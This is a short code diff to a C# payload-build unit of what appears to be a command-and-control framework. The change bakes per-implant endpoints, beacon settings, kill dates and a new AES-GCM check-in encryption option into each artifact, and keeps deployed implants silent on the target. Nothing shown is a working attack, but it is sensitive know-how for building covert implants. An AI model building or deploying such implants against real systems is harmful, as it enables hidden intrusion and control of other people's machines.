@@ -13,9 +13,11 @@ namespace Rod.BuildPipeline.PayloadBuild;
 /// implant source tree, baking the per-implant profile into a generated
 /// <c>BakedProfile.g.cs</c> source file so each artifact carries its own endpoint,
 /// check-in mode, beacon parameters, and kill date (architecture.md Sec 5.1).
-/// No key material exists at build time at all: the implant's identity is the
-/// keypair it generates at first run, bound by the CA at enroll
-/// (architecture.md Sec 9), so a captured artifact leaks nothing reusable.
+/// The implant's identity is never build-time material: the keypair it
+/// generates at first run, bound by the CA at enroll (architecture.md Sec 9).
+/// The one symmetric key a build does mint is the transport envelope key
+/// (Sec 7/8) -- it seals the enroll and check-in bodies, not identity, and it
+/// is per-artifact and revocable with the payload it is recorded beside.
 ///
 /// The teamserver is coupled to this unit only by the build contract: it sends
 /// <see cref="BuildParams"/> and gets a <see cref="BuildArtifact"/> back, and the
@@ -296,6 +298,14 @@ public sealed class DotNetBuildUnit : IBuildUnit
             ["headers"] = RenderHeadersMap(@params.Transport.Headers),
             ["requestTimeout"] = ((long)@params.Transport.RequestTimeout.TotalSeconds).ToString() + "s",
             ["envelope"] = @params.Transport.Envelope.ToString().ToLowerInvariant(),
+            // Check-in protection (architecture.md Sec 8/9), its own knob
+            // beside the enroll-body envelope: "aesgcm" seals every check-in
+            // body under the baked key, "none" is the lab-debug plaintext
+            // frame. The key must actually ride the params -- a protection
+            // ask with no key never bakes a seal the artifact cannot honor.
+            ["checkinEnvelope"] = @params.Transport.CheckInProtection && @params.EnvelopeKey is not null
+                ? "aesgcm"
+                : "none",
             ["verbs"] = verbs,
             // A deployed artifact narrates nothing: its console belongs to the
             // target, not to the operator. Quiet is the baked default for every
